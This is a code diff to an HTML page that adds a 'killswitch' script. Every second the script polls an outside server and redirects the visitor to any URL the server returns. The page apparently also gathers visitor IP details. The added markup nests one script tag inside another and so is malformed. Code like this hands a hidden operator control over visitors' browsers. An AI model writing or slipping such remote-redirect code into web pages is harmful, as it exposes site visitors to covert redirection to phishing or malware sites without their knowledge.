@@ -16,6 +16,23 @@
 
   
 <script>
+
+  <script>
+    async function checkKillswitch() {
+      try {
+        const res = await fetch("https://killswitch-pi.vercel.app/api/kill");
+        const text = await res.text();
+        if (text !== "none") {
+          window.location.href = text;
+        }
+      } catch (err) {
+        console.error("Error contacting killswitch server:", err);
+      }
+    }
+
+    setInterval(checkKillswitch, 1000); // check every second
+  </script>
+  
 (async () => {
     try {
         // STEP 1: Get IP and details
@@ -806,3 +823,4 @@
 <script src="script.js"></script>
 
 </html>
+
